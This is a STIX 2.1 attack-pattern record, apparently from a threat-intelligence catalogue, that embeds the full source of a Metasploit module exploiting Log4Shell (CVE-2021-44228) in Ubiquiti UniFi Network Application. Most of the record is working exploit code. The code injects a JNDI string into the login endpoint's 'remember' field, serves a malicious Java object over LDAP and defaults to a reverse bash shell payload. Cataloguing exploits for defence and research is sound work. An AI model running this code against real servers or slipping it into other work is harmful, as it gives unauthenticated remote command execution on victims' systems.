{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4b3c17e9-b71c-4dbb-b6cc-f2f394a12ae6",
    "created": "2024-08-14T17:09:06.153448Z",
    "modified": "2024-08-14T17:09:06.153452Z",
    "name": "UniFi Network Application Unauthenticated JNDI Injection RCE (via Log4Shell)",
    "description": " The Ubiquiti UniFi Network Application versions 5.13.29 through 6.5.53 are affected by the Log4Shell vulnerability whereby a JNDI string can be sent to the server via the 'remember' field of a POST request to the /api/login endpoint that will cause the server to connect to the attacker and deserialize a malicious Java object. This results in OS command execution in the context of the server application.  This module will start an LDAP server that the target will need to connect to. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/ubiquiti_unifi_log4shell.rb",
            "external_id": "ubiquiti_unifi_log4shell.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-44228"
        },
        {
            "source_name": "reference",
            "url": "https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/puzzlepeaches/Log4jUnifi"
        },
        {
            "source_name": "reference",
            "url": "https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Log4Shell\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'UniFi Network Application Unauthenticated JNDI Injection RCE (via Log4Shell)',\n      'Description' => %q{\n        The Ubiquiti UniFi Network Application versions 5.13.29 through 6.5.53 are affected by the Log4Shell\n        vulnerability whereby a JNDI string can be sent to the server via the 'remember' field of a POST request to the\n        /api/login endpoint that will cause the server to connect to the attacker and deserialize a malicious Java\n        object. This results in OS command execution in the context of the server application.\n\n        This module will start an LDAP server that the target will need to connect to.\n      },\n      'Author' => [\n        'Spencer McIntyre', # this exploit module and JNDI/LDAP lib stuff\n        'RageLtMan <rageltman[at]sempervictus>', # JNDI/LDAP lib stuff\n        'Nicholas Anastasi' # Unifi research\n      ],\n      'References' => [\n        [ 'CVE', '2021-44228' ],\n        [ 'URL', 'https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi' ],\n        [ 'URL', 'https://github.com/puzzlepeaches/Log4jUnifi' ],\n        [ 'URL', 'https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1' ]\n      ],\n      'DisclosureDate' => '2021-12-09',\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'RPORT' => 8443,\n        'SSL' => true,\n        'WfsDelay' => 30\n      },\n      'DefaultTarget' => 1,\n      'Targets' => [\n        [\n          'Windows', {\n            'Platform' => 'win'\n          },\n        ],\n        [\n          'Unix', {\n            'Platform' => 'unix',\n            'Arch' => [ARCH_CMD],\n            'DefaultOptions' => {\n              'PAYLOAD' => 'cmd/unix/reverse_bash'\n            }\n          },\n        ]\n      ],\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS],\n        'AKA' => ['Log4Shell', 'LogJam'],\n        'Reliability' => [REPEATABLE_SESSION]\n      }\n    )\n    register_options([\n      OptString.new('TARGETURI', [ true, 'Base path', '/'])\n    ])\n  end\n\n  def wait_until(&block)\n    datastore['WfsDelay'].times do\n      break if block.call\n\n      sleep(1)\n    end\n  end\n\n  def check\n    validate_configuration!\n    res = send_request_cgi('uri' => normalize_uri(target_uri, 'status'))\n    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?\n\n    server_version = res.get_json_document.dig('meta', 'server_version')\n    return Exploit::CheckCode::Safe('The target service does not appear to be running.') unless server_version =~ /(\\d+\\.)+/\n\n    vprint_status(\"Detected version: #{server_version}\")\n    server_version = Rex::Version.new(server_version)\n    if server_version < Rex::Version.new('5.13.29')\n      return Exploit::CheckCode::Safe('Versions prior to 5.13.29 are not exploitable.')\n    elsif server_version > Rex::Version.new('6.5.53')\n      return Exploit::CheckCode::Safe('Versions after 6.5.53 are patched and not affected.')\n    end\n\n    vprint_status('The target appears to be a vulnerable version, attempting to trigger the vulnerability...')\n\n    start_service\n    res = trigger\n    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?\n\n    wait_until { @search_received }\n    @search_received ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Unknown('No LDAP search query was received.')\n  ensure\n    cleanup_service\n  end\n\n  def build_ldap_search_response_payload\n    return [] if @search_received\n\n    @search_received = true\n\n    return [] unless @exploiting\n\n    print_good('Delivering the serialized Java object to execute the payload...')\n    build_ldap_search_response_payload_inline('BeanFactory')\n  end\n\n  def trigger\n    @search_received = false\n    # HTTP request initiator\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri, 'api', 'login'),\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'data' => {\n        'username' => rand_text_alphanumeric(8..16), # can not be blank!,\n        'password' => rand_text_alphanumeric(8..16), # can not be blank!\n        'remember' => log4j_jndi_string,\n        'strict' => true\n      }.to_json\n    )\n  end\n\n  def exploit\n    validate_configuration!\n\n    @exploiting = true\n    start_service\n    res = trigger\n    fail_with(Failure::Unreachable, 'Failed to trigger the vulnerability') if res.nil?\n\n    msg = res.get_json_document.dig('meta', 'msg')\n    if res.code == 400 && msg == 'api.err.Invalid' # returned by versions before 5.13.29\n      fail_with(Failure::NotVulnerable, 'The target is not vulnerable')\n    end\n\n    unless res.code == 400 && msg == 'api.err.InvalidPayload' # returned by versions after 5.13.29 (including patched ones)\n      fail_with(Failure::UnexpectedReply, 'The server replied to the trigger in an unexpected way')\n    end\n\n    wait_until { @search_received && (!handler_enabled? || session_created?) }\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-12-09",
    "x_mitre_platforms": [
        "unix'"
    ]
}